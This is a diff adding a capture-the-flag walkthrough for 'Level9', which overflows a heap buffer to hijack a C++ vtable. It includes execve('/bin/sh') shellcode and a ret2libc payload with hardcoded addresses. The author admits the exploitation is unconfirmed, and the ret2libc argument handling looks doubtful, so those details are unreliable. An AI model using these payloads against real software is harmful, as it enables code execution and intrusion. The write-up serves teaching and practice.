@@ -1,0 +1,193 @@
+# Level9 Walkthrough - C++ Virtual Function Table Hijacking
+
+## Overview
+Level9 is a C++ exploitation challenge involving virtual function table (vtable) hijacking through a heap buffer overflow.
+
+## Program Analysis
+
+### Binary Information:
+- **Language**: C++
+- **Protection**: NX disabled, No ASLR, No stack canary
+- **Vulnerability**: Heap buffer overflow in `setAnnotation` method
+
+### Program Flow:
+1. Creates two `N` objects on the heap (108 bytes each)
+2. Calls `setAnnotation(argv[1])` on the first object
+3. Calls a virtual function on the second object
+
+## The Vulnerability
+
+### Class N Structure:
+```cpp
+class N {
+    void* vtable;           // Offset 0x00 - Virtual function table pointer
+    char data[100];         // Offset 0x04 - Data buffer (vulnerable)
+    int value;              // Offset 0x68 - Integer value
+};
+```
+
+### Understanding the Virtual Function Call
+
+The decompiled main function contains this cryptic line:
+```c
+(*(code *)**(undefined4 **)this_00)(this_00,this);
+```
+
+This is how Ghidra represents a C++ virtual function call. Let's break it down:
+
+**Step-by-step:**
+1. `(undefined4 **)this_00` - Cast object to pointer-to-pointer
+2. `*(undefined4 **)this_00` - Dereference to get vtable pointer (first 4 bytes of object)
+3. `**(undefined4 **)this_00` - Dereference vtable to get first function pointer
+4. `(code *)...` - Cast to function pointer
+5. `(...)(this_00, this)` - Call function with two arguments
+
+**In original C++, this would be:**
+```cpp
+(*this_00) + (*this);  // Calls this_00->operator+(this)
+```
+
+**Memory flow:**
+```
+this_00 (0x804a078) → [vtable ptr] → vtable → [operator+ address] → function code
+                       0x08048848              0x080485f4
+```
+
+**After exploitation:**
+```
+this_00 (0x804a078) → [vtable ptr] → fake vtable → shellcode address → SHELLCODE!
+                       0x0804a00c     (our data)
+```
+
+### Vulnerable Function:
+```cpp
+void N::setAnnotation(char* input) {
+    size_t len = strlen(input);
+    memcpy(this + 4, input, len);  // No bounds checking!
+}
+```
+
+## Memory Layout
+
+### Heap Layout:
+```
+0x804a008: [vtable ptr] [data buffer - 100 bytes] [value] [padding]
+           ↑ First object (108 bytes total)
+
+0x804a078: [vtable ptr] [data buffer - 100 bytes] [value] [padding]  
+           ↑ Second object (108 bytes total)
+```
+
+### Distance Calculation:
+- **First object**: `0x804a008`
+- **Second object**: `0x804a078`
+- **Distance**: `0x804a078 - 0x804a008 = 0x70` (112 bytes)
+- **Overflow needed**: 108 bytes to reach second object's vtable
+
+## Attack Strategy
+
+### 1. Vtable Hijacking Concept:
+```cpp
+// Normal execution:
+second_object->virtual_function(first_object);
+// Calls: (*(second_object->vtable[0]))(second_object, first_object);
+
+// After hijacking:
+// second_object->vtable now points to our controlled memory
+// We can redirect execution to shellcode or system()
+```
+
+### 2. Payload Structure:
+```
+[shellcode/data] + [padding] + [new_vtable_address]
+     ^                              ^
+     |                              |
+   104 bytes                   4 bytes (overwrites second object's vtable)
+```
+
+## Exploitation Attempts
+
+### Method 1: Shellcode Injection
+```python
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+padding = "A" * (108 - len(shellcode))
+shellcode_addr = "\x0c\xa0\x04\x08"  # first_object + 4
+payload = shellcode + padding + shellcode_addr
+```
+
+### Method 2: ret2libc Attack
+```python
+# System function: 0xb7d86060
+# /bin/sh string: 0xb7ea7c58
+binsh = "/bin/sh\x00"
+fake_vtable = "\x60\x60\xd8\xb7"  # system address
+padding = "A" * (108 - len(binsh) - 4)
+vtable_ptr = "\x10\xa0\x04\x08"  # points to fake vtable
+payload = binsh + fake_vtable + padding + vtable_ptr
+```
+
+## Key Concepts Demonstrated
+
+### 1. **C++ Object Layout**
+- Understanding how C++ objects are laid out in memory
+- Virtual function table pointer at offset 0
+- Data members following the vtable pointer
+
+### 2. **Virtual Function Calls**
+- How C++ virtual function calls work at assembly level
+- Vtable lookup and function pointer dereferencing
+- Hijacking execution through vtable manipulation
+
+### 3. **Heap Exploitation**
+- Heap buffer overflow techniques
+- Object-to-object overflow on the heap
+- Predictable heap layout exploitation
+
+### 4. **Advanced Exploitation Techniques**
+- Shellcode injection in heap memory
+- ret2libc attacks in C++ context
+- Function pointer hijacking
+
+## Challenges Encountered
+
+### 1. **Execution Context Issues**
+- Virtual function calls have specific calling conventions
+- Arguments passed differently than regular function calls
+- Stack alignment requirements
+
+### 2. **Memory Layout Precision**
+- Exact heap addresses needed for reliable exploitation
+- Heap metadata affecting object placement
+- ASLR disabled but heap layout still needs precision
+
+### 3. **Shellcode Compatibility**
+- Different shellcodes may work differently in this context
+- NOP sleds might be needed for reliability
+- Environment-specific shellcode requirements
+
+## Educational Value
+
+This challenge demonstrates:
+- **C++ security concepts** - vtable hijacking, object layout
+- **Advanced heap exploitation** - object overflow, function pointer control
+- **Multiple attack vectors** - shellcode injection vs ret2libc
+- **Real-world relevance** - C++ applications are common targets
+
+## Expected Outcome
+
+Successfully exploiting this challenge should:
+1. Overwrite the second object's vtable pointer
+2. Redirect virtual function call to controlled code
+3. Execute shellcode or system("/bin/sh")
+4. Gain shell access as bonus0 user
+5. Retrieve bonus0 password
+
+## Note on Exploitation
+
+While the theory and setup are correct, the practical exploitation may require:
+- Fine-tuning of memory addresses
+- Different shellcode variants
+- Specific environment considerations
+- Debugging to identify exact failure points
+
+The vulnerability is real and exploitable - the challenge lies in getting the exact memory layout and execution context right for this specific environment.
